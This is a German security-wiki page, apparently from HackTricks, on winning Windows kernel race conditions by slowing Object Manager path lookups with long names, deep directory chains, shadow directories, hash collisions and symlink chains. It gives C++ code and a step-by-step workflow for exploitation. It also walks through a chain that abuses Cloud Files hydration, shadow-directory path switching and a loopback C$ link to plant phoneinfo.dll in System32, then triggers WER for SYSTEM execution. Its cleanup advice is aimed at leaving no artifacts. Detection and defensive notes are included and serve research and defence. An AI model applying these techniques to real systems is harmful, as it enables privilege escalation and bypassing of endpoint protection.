# Ausnutzung von Kernel Race Conditions über langsame Pfade des Object Managers

{{#include ../../banners/hacktricks-training.md}}

## Warum die Verlängerung des Race-Fensters wichtig ist

Viele Windows-Kernel-LPEs folgen dem klassischen Muster `check_state(); NtOpenX("name"); privileged_action();`. Auf moderner Hardware löst ein kalter Aufruf von `NtOpenEvent`/`NtOpenSection` einen kurzen Namen in etwa 2 µs auf, sodass kaum Zeit bleibt, den überprüften Zustand zu ändern, bevor die geschützte Aktion erfolgt. Indem der Angreifer die Namespace-Suche des Object Managers (OMNS) in Schritt 2 gezielt auf mehrere zehn Mikrosekunden verlängert, erhält er genug Zeit, um ansonsten unzuverlässige Races konsistent zu gewinnen, ohne Tausende von Versuchen zu benötigen.<sup>[[1]](#references)</sup>

## Interna der Object-Manager-Suche im Überblick

* **OMNS-Struktur** – Namen wie `\BaseNamedObjects\Foo` werden Verzeichnis für Verzeichnis aufgelöst. Jede Komponente veranlasst den Kernel, ein *Object Directory* zu finden bzw. zu öffnen und Unicode-Strings zu vergleichen. Symbolic Links (z. B. Laufwerksbuchstaben) können dabei durchlaufen werden.
* **UNICODE_STRING-Limit** – OM-Pfade werden in einer `UNICODE_STRING` übergeben, deren `Length` ein 16-Bit-Wert ist. Das absolute Limit beträgt 65 535 Bytes (32 767 UTF-16-Codepoints). Bei Präfixen wie `\BaseNamedObjects\` kontrolliert ein Angreifer weiterhin ungefähr 32 000 Zeichen.
* **Voraussetzungen für den Angreifer** – Jeder Benutzer kann Objekte unter beschreibbaren Verzeichnissen wie `\BaseNamedObjects` erstellen. Wenn der verwundbare Code einen darin befindlichen Namen verwendet oder einem Symbolic Link folgt, der dort endet, kontrolliert der Angreifer die Performance der Suche ohne besondere Berechtigungen.<sup>[[1]](#references)</sup>

## Slowdown Primitive #1 – Einzelne maximale Komponente

Die Kosten für die Auflösung einer Komponente sind ungefähr linear zu ihrer Länge, da der Kernel einen Unicode-Vergleich mit jedem Eintrag im übergeordneten Verzeichnis durchführen muss. Das Erstellen eines Events mit einem 32 kB langen Namen erhöht die Latenz von `NtOpenEvent` unter Windows 11 24H2 auf einem Snapdragon-X-Elite-Testsystem unmittelbar von etwa 2 µs auf etwa 35 µs.
```cpp
std::wstring path;
while (path.size() <= 32000) {
auto result = RunTest(L"\\BaseNamedObjects\\A" + path, 1000);
printf("%zu,%f\n", path.size(), result);
path += std::wstring(500, 'A');
}
```
*Praktische Hinweise*

- Du kannst das Längenlimit mit jedem benannten Kernel-Objekt erreichen (Events, Sections, Semaphores …).
- Symbolic links oder Reparse points können einen kurzen „victim“-Namen auf diese riesige Komponente verweisen, sodass die Verlangsamung transparent angewendet wird.
- Da sich alles in Namespaces befindet, die vom Benutzer beschrieben werden können, funktioniert das Payload bereits mit einer standardmäßigen Benutzerintegritätsstufe.<sup>[[1]](#references)</sup>

## Slowdown primitive #2 – Tiefe rekursive Verzeichnisse

Eine aggressivere Variante reserviert eine Kette aus Tausenden von Verzeichnissen (`\BaseNamedObjects\A\A\...\X`). Jeder Sprung löst die Logik zur Verzeichnisauflösung aus (ACL-Prüfungen, Hash-Lookups, Referenzzählung), sodass die Latenz pro Ebene höher ist als bei einem einfachen Stringvergleich. Bei etwa 16.000 Ebenen (begrenzt durch dieselbe `UNICODE_STRING`-Größe) überschreiten empirische Messungen die 35-µs-Grenze, die mit langen einzelnen Komponenten erreicht wird.
```cpp
ScopedHandle base_dir = OpenDirectory(L"\\BaseNamedObjects");
HANDLE last_dir = base_dir.get();
std::vector<ScopedHandle> dirs;
for (int i = 0; i < 16000; i++) {
dirs.emplace_back(CreateDirectory(L"A", last_dir));
last_dir = dirs.back().get();
if ((i % 500) == 0) {
auto result = RunTest(GetName(last_dir) + L"\\X", iterations);
printf("%d,%f\n", i + 1, result);
}
}
```
Tipps:

* Wechsle die Zeichen pro Ebene (`A/B/C/...`), falls das übergeordnete Verzeichnis beginnt, Duplikate abzulehnen.
* Halte ein Handle-Array vor, damit du die Kette nach der Exploitation sauber löschen kannst und den Namespace nicht verunreinigst.<sup>[[1]](#references)</sup>

## Slowdown primitive #3 – Shadow directories, hash collisions & symlink reparses (Minuten statt Mikrosekunden)

Object directories unterstützen **shadow directories** (Fallback-Lookups) und in Buckets organisierte Hash-Tabellen für Einträge. Missbrauche beides sowie das Reparse-Limit von 64 Komponenten für symbolische Links, um die Verlangsamung zu vervielfachen, ohne die Länge von `UNICODE_STRING` zu überschreiten:

1. Erstelle zwei Verzeichnisse unter `\BaseNamedObjects`, z. B. `A` (shadow) und `A\A` (target). Erstelle das zweite Verzeichnis mit dem ersten als shadow directory (`NtCreateDirectoryObjectEx`), sodass fehlende Lookups in `A` auf `A\A` zurückfallen.
2. Fülle jedes Verzeichnis mit Tausenden **colliding names**, die im selben Hash-Bucket landen (z. B. durch variierende Endziffern bei gleichbleibendem `RtlHashUnicodeString`-Wert). Lookups verschlechtern sich nun zu linearen O(n)-Scans innerhalb eines einzelnen Verzeichnisses.
3. Erstelle eine Kette aus etwa 63 **object manager symbolic links**, die wiederholt in das lange Suffix `A\A\…` reparsen und dabei das Reparse-Budget aufbrauchen. Jedes Reparse startet das Parsing von oben neu und vervielfacht die Kosten der Kollisionen.
4. Der Lookup der letzten Komponente (`...\\0`) dauert unter Windows 11 bei 16 000 Kollisionen pro Verzeichnis nun **Minuten** und ermöglicht bei One-Shot-Kernel-LPEs praktisch garantiert einen erfolgreichen Race-Gewinn.
```cpp
ScopedHandle shadow = CreateDirectory(L"\\BaseNamedObjects\\A");
ScopedHandle target = CreateDirectoryEx(L"A", shadow.get(), shadow.get());
CreateCollidingEntries(shadow, 16000, dirs);
CreateCollidingEntries(target, 16000, dirs);
CreateSymlinkChain(shadow, LongSuffix(L"\\A", 16000), 63);
printf("%f\n", RunTest(LongSuffix(L"\\A", 16000) + L"\\0", 1));
```
*Warum es wichtig ist*: Eine minutenlange Verlangsamung verwandelt einmalig auslösbare race-basierte LPEs in deterministische Exploits.<sup>[[1]](#references)</sup>

### Hinweise zum Retest 2025 und fertige Tools

- James Forshaw hat die Technik mit aktualisierten Timings unter Windows 11 24H2 (ARM64) erneut veröffentlicht. Normale Opens bleiben bei etwa 2 µs; eine 32-kB-Komponente erhöht diesen Wert auf etwa 35 µs, und shadow-dir + collision + 63-reparse-Ketten erreichen weiterhin etwa 3 Minuten. Damit ist bestätigt, dass die Primitives aktuelle Builds überleben. Source code und der perf harness befinden sich im aktualisierten Project-Zero-Post.<sup>[[1]](#references)</sup>
- Du kannst das Setup mit dem öffentlichen Bundle `symboliclink-testing-tools` skripten: `CreateObjectDirectory.exe` erzeugt das shadow/target-Paar und `NativeSymlink.exe` erstellt in einer Schleife die 63-Hop-Kette. Dadurch entfallen selbst geschriebene `NtCreate*`-Wrapper, und die ACLs bleiben konsistent.<sup>[[2]](#references)</sup>

## Dein Race-Fenster messen

Bette einen kurzen Harness in deinen Exploit ein, um zu messen, wie groß das Fenster auf der Hardware des Opfers wird. Das folgende Snippet öffnet das Zielobjekt `iterations`-mal und gibt mithilfe von `QueryPerformanceCounter` die durchschnittlichen Kosten pro Open zurück.<sup>[[1]](#references)</sup>
```cpp
static double RunTest(const std::wstring name, int iterations,
std::wstring create_name = L"", HANDLE root = nullptr) {
if (create_name.empty()) {
create_name = name;
}
ScopedHandle event_handle = CreateEvent(create_name, root);
ObjectAttributes obja(name);
std::vector<ScopedHandle> handles;
Timer timer;
for (int i = 0; i < iterations; ++i) {
HANDLE open_handle;
Check(NtOpenEvent(&open_handle, MAXIMUM_ALLOWED, &obja));
handles.emplace_back(open_handle);
}
return timer.GetTime(iterations);
}
```
Die Ergebnisse fließen direkt in deine Race-Orchestrierungsstrategie ein (z. B. Anzahl der benötigten Worker-Threads, Sleep-Intervalle und wie früh du den gemeinsam genutzten Zustand umschalten musst).

## Exploitation-Workflow

1. **Das verwundbare Öffnen lokalisieren** – Verfolge den Kernel-Pfad (über Symbole, ETW, Hypervisor-Tracing oder Reversing), bis du einen `NtOpen*`-/`ObOpenObjectByName`-Aufruf findest, der einen vom Angreifer kontrollierten Namen oder einen symbolischen Link in einem vom Benutzer beschreibbaren Verzeichnis durchläuft.
2. **Diesen Namen durch einen langsamen Pfad ersetzen**
- Erstelle die lange Komponente oder Verzeichniskette unter `\BaseNamedObjects` (oder einem anderen beschreibbaren OM-Root).
- Erstelle einen symbolischen Link, sodass der vom Kernel erwartete Name nun auf den langsamen Pfad aufgelöst wird. Du kannst die Verzeichnissuche des verwundbaren Treibers auf deine Struktur verweisen, ohne das ursprüngliche Ziel zu verändern.
3. **Die Race auslösen**
- Thread A (Opfer) führt den verwundbaren Code aus und blockiert innerhalb der langsamen Suche.
- Thread B (Angreifer) schaltet den geschützten Zustand um (z. B. durch Austauschen eines Datei-Handles, Umschreiben eines symbolischen Links oder Umschalten der Objektsicherheit), während Thread A beschäftigt ist.
- Wenn Thread A fortfährt und die privilegierte Aktion ausführt, sieht er veralteten Zustand und führt die vom Angreifer kontrollierte Operation aus.
4. **Aufräumen** – Lösche die Verzeichniskette und die symbolischen Links, damit keine verdächtigen Artefakte zurückbleiben oder legitime IPC-Benutzer beeinträchtigt werden.<sup>[[1]](#references)</sup>

## Angewandte Kette: Mutable Cloud Files Placeholders + Object Manager Path Switching

[ShieldBreak](https://github.com/MSNightmare/ShieldBreak), veröffentlicht als Bypass für RoguePlanet (CVE-2026-50656), demonstriert ein umfassenderes Exploitation-Muster: Einen privilegierten Scanner dazu bringen, eine Repräsentation einer logischen Datei zu klassifizieren, und anschließend sowohl deren Bytes als auch die Namespace-Auflösung zu ändern, bevor die Remediation sie verwendet. Der PoC kombiniert eine Cloud Files-Hydration-TOCTOU, einen Object-Manager-Schattenverzeichnis-Fallback, die Erfassung eines CLFS-generierten Namens und einen lokalen Link zu einer administrativen Freigabe, um die Defender-Bereinigung in einen geschützten DLL-Schreibvorgang umzuwandeln.<sup>[[3]](#references)[[4]](#references)</sup>

### 1. Inhalte durch Cloud Files Hydration ersetzen

Registriere ein vom Angreifer beschreibbares Verzeichnis als Cloud-Files-Sync-Root, verbinde einen `CF_CALLBACK_TYPE_FETCH_DATA`-Callback und erstelle einen Placeholder, dessen angegebene Größe einem deterministischen Detection-Trigger wie dem EICAR ZIP entspricht. Der erste Fetch gibt den Trigger zurück und schaltet den Callback-Zustand um; spätere Fetches geben die Payload zurück. Nachdem der Scanner die erste Repräsentation klassifiziert hat, beschaffe den Transfer-Key und starte die Hydration mit Metadaten in Payload-Größe neu. Erzwinge anschließend die Hydration bis zum EOF.<sup>[[4]](#references)</sup>
```cpp
CfRegisterSyncRoot(sync_root, &registration, &policies, flags);
CfConnectSyncRoot(sync_root, callbacks, &state, connect_flags, &connection);
CfCreatePlaceholders(sync_root, &placeholder, 1, 0, &created);
// First FETCH_DATA => detection trigger; later FETCH_DATA => payload.
CfGetTransferKey(placeholder_handle, &transfer_key);
opInfo.Type = CF_OPERATION_TYPE_RESTART_HYDRATION;
CfExecute(&opInfo, &restart_params);
CfHydratePlaceholder(placeholder_handle, {0}, CF_EOF, 0, NULL);
```
Die Sicherheitsgrenze versagt, wenn Scan, Verdict und Remediation sich nur auf einen Pfadnamen oder eine Platzhalteridentität beziehen: Keines von beiden garantiert, dass eine spätere Hydration die untersuchten Bytes zurückgibt.<sup>[[4]](#references)</sup>

### 2. Einen invarianten Pfad über einen Shadow-Directory-Fallback umschalten

Erstelle mit `NtCreateDirectoryObjectEx` ein Zielverzeichnis im Object Manager sowie ein zweites Verzeichnis und übergib dabei das Handle des Ziels als Shadow-/Fallback-Verzeichnis. Füge in beiden Auflösungsebenen einen gleichnamigen `WD_SCAN`-Eintrag ein: Der sichtbare Eintrag verweist auf das normale Arbeitsverzeichnis, während der Fallback-Eintrag auf `\CLFS\??\<working-directory>` verweist. Übergebe Defender nur den folgenden invarianten Pfad; durch das Löschen des sichtbaren Links, während der Vorgang aktiv ist, fällt dieselbe Zeichenfolge auf den CLFS-basierten Eintrag zurück.<sup>[[4]](#references)</sup>
```text
\\.\globalroot\BaseNamedObjects\Restricted\WD_SHADOW_<GUID>\WD_SCAN\BERLIN
```
Dies unterscheidet sich davon, Shadow-Verzeichnisse nur zur Verlangsamung der Suche zu verwenden: Der Angreifer ändert die **Bedeutung** eines zuvor akzeptierten Pfads, ohne dessen Zeichenfolge zu verändern.<sup>[[4]](#references)</sup>

### 3. Den generierten Namen erfassen und einen dateinamensspezifischen Link installieren

Überwache das Arbeitsverzeichnis mit `ReadDirectoryChangesW`. Entferne beim ersten `FILE_ACTION_ADDED` den sichtbaren `WD_SCAN`-Link, um die Fallback-Suche zu aktivieren. Erfasse den zweiten generierten Dateinamen, öffne diese CLFS-bezogene Datei und sperre den Bereich `0..MAXLONGLONG` mit `LockFileEx`. Während die privilegierte Operation angehalten ist, ersetze `WD_SCAN` im sichtbaren Verzeichnis durch ein echtes Object Manager-Verzeichnis und erstelle einen untergeordneten symbolischen Link mit dem Namen der beobachteten Datei (der PoC entfernt die letzten vier Zeichen). Verweise über lokales SMB auf das geschützte Ziel:<sup>[[4]](#references)</sup>
```text
\??\UNC\127.0.0.1\C$\Windows\System32\phoneinfo.dll
```
Der unprivilegierte Prozess kann selbst nicht in dieses Ziel schreiben, aber der SYSTEM-Kontext von Defender kann die Loopback-Administrative Share durchqueren. Die Kombination aus der Beobachtung generierter Namen und einem dateinamenspezifischen Object Manager-Link macht es überflüssig, das Remediation-Artefakt im Voraus vorherzusagen.<sup>[[4]](#references)</sup>

### 4. Die Cleanup-Race stabilisieren und einen privilegierten Loader auslösen

Vor dem Scannen speichert der PoC eine gültige PE-Datei (`ntdll.dll`) im Platzhalter-` :stream`-NTFS-Alternate-Data-Stream. Nachdem die Redirection die geschützte Basisdatei erstellt hat, öffnet er `phoneinfo.dll:stream` mit Execute-Zugriff und hält ein `PAGE_EXECUTE_READ | SEC_IMAGE`-Mapping aktiv, während das Cleanup fortgesetzt wird; die aktiven Datei-/Section-Objekte erschweren das Löschen oder Ersetzen während der finalen Race. Die neu gestartete Hydration gibt nun die Payload-DLL statt EICAR zurück, sodass die geschützte Basisdatei vom Angreifer kontrollierten Code enthält.<sup>[[4]](#references)</sup>

Ein geschützter Schreibvorgang wird anschließend durch das Platzieren einer präparierten `Report.wer` unter `C:\ProgramData\Microsoft\Windows\WER\ReportQueue\...` und das Aufrufen von `\Microsoft\Windows\Windows Error Reporting\QueueReporting` über die Task-Scheduler-COM-API in eine SYSTEM-Ausführung umgewandelt. In dieser Chain lädt die privilegierte WER-Verarbeitung die platzierte `C:\Windows\System32\phoneinfo.dll`; eine Named-Pipe-Verbindung dient als Signal für die Payload-Ausführung.<sup>[[4]](#references)</sup>

### Detection pivots

Nützliche Korrelationen sind spezifischer als ein einzelner temporärer Dateiname und decken alle Namespace-Übergänge in der Chain ab:<sup>[[4]](#references)</sup>

- Ein neu registrierter Cloud Files Provider, gefolgt von einer EICAR-Erkennung und `CF_OPERATION_TYPE_RESTART_HYDRATION` auf demselben Platzhalter.
- Object-Manager-Pfade, die `WD_TARGET_*`, `WD_SHADOW_*` oder `WD_SCAN` enthalten, insbesondere ein Scan-Pfad unterhalb von `\\.\globalroot\BaseNamedObjects\Restricted\`.
- CLFS-Dateierstellung, gefolgt von einer exklusiven Sperre der gesamten Datei und einem Loopback-Zugriff auf `\\127.0.0.1\C$\Windows\System32\*.dll` durch einen privilegierten Sicherheitsprozess.
- Erstellung einer System32-DLL zusammen mit einem NTFS-ADS, gefolgt von einem `SEC_IMAGE`-Mapping des Streams.
- Ein vom Angreifer erstellter WER-Queue-Eintrag, gefolgt von einer ungewöhnlichen manuellen Ausführung von `\Microsoft\Windows\Windows Error Reporting\QueueReporting` und dem Laden eines Images der platzierten DLL.

## Operative Überlegungen

- **Primitives kombinieren** – Du kannst *pro Ebene* in einer Verzeichniskette einen langen Namen verwenden, um noch höhere Latenz zu erreichen, bis du die Größe von `UNICODE_STRING` ausschöpfst.
- **One-shot-Bugs** – Das vergrößerte Zeitfenster (von einigen zehn Mikrosekunden bis zu Minuten) macht „Single-Trigger“-Bugs realistisch, wenn sie mit CPU-Affinity-Pinning oder einer durch den Hypervisor unterstützten Preemption kombiniert werden.
- **Nebenwirkungen** – Die Verlangsamung betrifft nur den bösartigen Pfad, sodass die allgemeine Systemleistung unbeeinträchtigt bleibt; Verteidiger werden dies selten bemerken, sofern sie das Wachstum des Namespace nicht überwachen.
- **Cleanup** – Halte Handles zu jedem von dir erstellten Verzeichnis/Objekt offen, damit du anschließend `NtMakeTemporaryObject`/`NtClose` aufrufen kannst. Unbegrenzte Verzeichnisketten können andernfalls Neustarts überdauern.
- **File-system races** – Wenn der verwundbare Pfad letztlich über NTFS aufgelöst wird, kannst du während der OM-Verlangsamung ein Oplock (z. B. `SetOpLock.exe` aus demselben Toolkit) auf der zugrunde liegenden Datei platzieren. Dadurch wird der Consumer für zusätzliche Millisekunden eingefroren, ohne den OM-Graphen zu verändern.<sup>[[2]](#references)</sup>

## Defensive Hinweise

- Kernel-Code, der sich auf Named Objects stützt, sollte sicherheitsrelevanten Zustand *nach* dem Öffnen erneut validieren oder vor der Prüfung eine Referenz übernehmen (wodurch das TOCTOU-Fenster geschlossen wird).
- Erzwinge Obergrenzen für Tiefe/Länge von OM-Pfaden, bevor benutzerkontrollierte Namen dereferenziert werden. Die Ablehnung übermäßig langer Namen zwingt Angreifer zurück in das Mikrosekundenfenster.
- Instrumentiere das Wachstum des Object-Manager-Namespace (ETW `Microsoft-Windows-Kernel-Object`), um verdächtige Ketten mit Tausenden von Komponenten unter `\BaseNamedObjects` zu erkennen.

## References

- [1] [Project Zero – Windows Exploitation Techniques: Winning Race Conditions with Path Lookups](https://projectzero.google/2025/12/windows-exploitation-techniques.html)
- [2] [googleprojectzero/symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)
- [3] [MSNightmare/ShieldBreak](https://github.com/MSNightmare/ShieldBreak)
- [4] [ShieldBreak.cpp (commit be016d8)](https://github.com/MSNightmare/ShieldBreak/blob/be016d8c18c8355a12753286c1ce9d5a48a0dab4/ShieldBreak.cpp)
{{#include ../../banners/hacktricks-training.md}}
